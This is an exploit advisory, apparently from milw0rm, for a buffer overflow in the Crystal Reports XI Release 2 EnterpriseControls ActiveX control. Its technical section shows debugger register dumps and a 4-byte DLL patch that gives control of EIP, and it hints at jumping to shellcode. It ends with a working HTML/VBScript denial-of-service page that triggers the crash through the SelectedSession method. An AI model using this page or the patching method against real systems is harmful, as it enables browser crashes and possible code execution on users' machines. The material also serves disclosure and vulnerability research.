@@ -1,0 +1,190 @@
+#####################################################################################
+
+Application:  Crystal Reports XI Release 2 (Enterprise Tree Control) Remote BoF/Dos
+              www.businessobjects.com
+Versions:     11
+Platforms:    Windows XP Professional
+Bug:          buffer-overflow
+Exploitation: remote
+Date:         2007-01-16
+
+Author:       shinnai
+              e-mail: shinnai[at]autistici[dot]org
+              web:    http://shinnai.altervista.org
+
+#####################################################################################
+
+1) Introduction
+2) Technical details and bug
+3) The Code
+4) Fix
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+This component is used to visualize on the web reports created with
+Crystal Reports
+
+#####################################################################################
+
+============================
+2) Technical details and bug
+============================
+
+Name:	EnterpriseControls.dll
+Ver.:	11.5.0.313
+CLSID:	{3D58C9F3-7CA5-4C44-9D62-C5B63E059050}
+MD5:	179e2dc7f9f6e9d6e0210e89c623fd72
+
+Marked as:
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+Implements IObjectSafety: True
+IDisp Safe: Safe for untrusted: caller,data
+IPStorage Safe: Safe for untrusted: caller,data
+
+The problem is a buffer-overflow which occours when you use the
+"SelectedSession()" method.
+It seems that, during the initialization of the component, a race
+condition occours between threads and 4 bytes of the same component
+will overwrite EIP.
+If you patch these 4 bytes, you can control this register, using
+it to jump to a shellcode and execute arbitrary code on user's pc.
+For exploiting this vulnerability you only need to create a web
+page containing the CLSID and the codebase path to your crafted
+ActiveX.
+These are registers using the original file:
+14:59:34.126  pid=1468 tid=1250  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [FF7DE928])
+              ----------------------------------------------------------------
+              EAX=5A4472D4: 83 6C 24 04 28 E9 7D FF-FF FF 83 6C 24 04 2C E9
+              EBX=036B68CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A
+              ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              ESP=01FCF3A8: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 68 F4 FC 01
+              EBP=01FCF3D4: 5C F4 FC 01 77 01 45 5A-68 F4 FC 01 54 F7 07 03
+              ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B
+              EDI=036B68F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A
+              EIP=FF7DE928: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+
+14:59:34.142  pid=1468 tid=1250  EXCEPTION (unhandled)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [FF7DE928])
+              ----------------------------------------------------------------
+              EAX=5A4472D4: 83 6C 24 04 28 E9 7D FF-FF FF 83 6C 24 04 2C E9
+              EBX=036B68CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A
+              ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              ESP=01FCF3A8: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 68 F4 FC 01
+              EBP=01FCF3D4: 5C F4 FC 01 77 01 45 5A-68 F4 FC 01 54 F7 07 03
+              ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B
+              EDI=036B68F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A
+              EIP=FF7DE928: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+
+We'll find these 4 bytes at this address:
+0x000172D8 "28 E9 7D FF"...
+
+using an hex editor to modify to:
+0x000172D8 "42 42 42 42"...
+
+we'll have:
+
+C:\Tools>bindiff /c /d EnterpriseControls_patched.dll EnterpriseControls_ori.dll
+
+Different, Left is newer  4 bytes differ
+================================================================================
+000172D0  87 FF FF FF 83 6C 24 04  .....l$.   87 FF FF FF 83 6C 24 04  .....l$.
+000172D8 <42 42 42 42>FF FF 83 6C  BBBB...l  <28 E9 7D FF>FF FF 83 6C  (.}....l
+000172E0  24 04 2C E9              $.,.       24 04 2C E9              $.,.    
+================================================================================
+
+File Count Summary
+   Identical:      0 files
+   Near Identical: 0 files
+   Different:      1 files
+   Left Only:      0 files
+   Right Only:     0 files
+   Errors:         0 files
+   Total:          1 files
+
+Byte Count Summary
+   Matched:    4 bytes differ
+   Left Only:  0 bytes
+   Right Only: 0 bytes
+   Total:      4 bytes
+
+and registers values will be:
+15:05:38.947  pid=12D4 tid=1240  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [42424242])
+              ----------------------------------------------------------------
+              EAX=5A4472D4: 83 6C 24 04 42 42 42 42-FF FF 83 6C 24 04 2C E9
+              EBX=037368CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A
+              ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              ESP=01FCF3CC: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 8C F4 FC 01
+              EBP=01FCF3F8: 80 F4 FC 01 77 01 45 5A-8C F4 FC 01 CC 99 9D 02
+              ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B
+              EDI=037368F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A
+              EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+
+15:05:38.978  pid=12D4 tid=1240  EXCEPTION (unhandled)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [42424242])
+              ----------------------------------------------------------------
+              EAX=5A4472D4: 83 6C 24 04 42 42 42 42-FF FF 83 6C 24 04 2C E9
+              EBX=037368CC: 44 C7 4D 5A 28 C7 4D 5A-00 C7 4D 5A D4 C6 4D 5A
+              ECX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              EDX=5A4DC55C: D4 72 44 5A 65 6C 44 5A-6F 6C 44 5A E4 6F 44 5A
+              ESP=01FCF3CC: B4 3B 43 5A 5C C5 4D 5A-C8 F7 44 5A 8C F4 FC 01
+              EBP=01FCF3F8: 80 F4 FC 01 77 01 45 5A-8C F4 FC 01 CC 99 9D 02
+              ESI=5A4DE140: 79 3A 5C 66 72 61 6D 65-77 6F 72 6B 5F 73 64 6B
+              EDI=037368F4: 5C C5 4D 5A 44 C5 4D 5A-01 00 00 00 30 C5 4D 5A
+              EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+                            --> N/A
+              ----------------------------------------------------------------
+
+isn't it fun?
+Naturally, EIP overwrite requires that someone uses the crafted dll otherwise
+you can just enjoy a crash of tha application.
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+I will release a public exploit but, this time, no code execution ;-)
+Everything I could say is that you can directly inject your shellcode into the dll
+or pass an argument to "SelectedSession()" method and then jump to the shellcode.
+
+Poc: Click here for DoS exploit
+
+<html>
+ <object classid='clsid:3D58C9F3-7CA5-4C44-9D62-C5B63E059050' id='test'></object>
+  <script language = 'vbscript'>
+   test.SelectedSession = ""
+  </script>
+</html>
+
+#####################################################################################
+
+======
+4) Fix
+======
+
+No fix
+
+#####################################################################################
+
+# milw0rm.com [2008-01-17]
